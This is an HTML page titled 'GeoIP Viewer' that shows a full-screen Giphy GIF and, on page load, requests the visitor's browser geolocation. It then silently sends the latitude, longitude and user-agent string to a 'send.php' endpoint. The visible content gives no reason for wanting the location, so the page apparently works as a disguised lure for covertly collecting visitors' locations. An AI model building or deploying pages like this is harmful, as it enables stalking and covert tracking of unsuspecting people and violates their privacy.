<html>
<head>
  <title>GeoIP Viewer</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    .giphy-embed {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
    }
  </style>
</head>
<body onload="getLocation()">
<script>
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  }
}

function showPosition(position) {
  const xhttp = new XMLHttpRequest();
  xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&agent=" + navigator.userAgent )
  xhttp.send();
}
</script>
<iframe src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExaHpydmlhNWhwOXN2ZTIwM2U3ajdpemZ3OTFvdWxqbHloeG5rOGtiaiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MBIcJIaE8SLY6jKrqp/giphy.gif" class="giphy-embed" allowFullScreen></iframe>
</body>
</html>
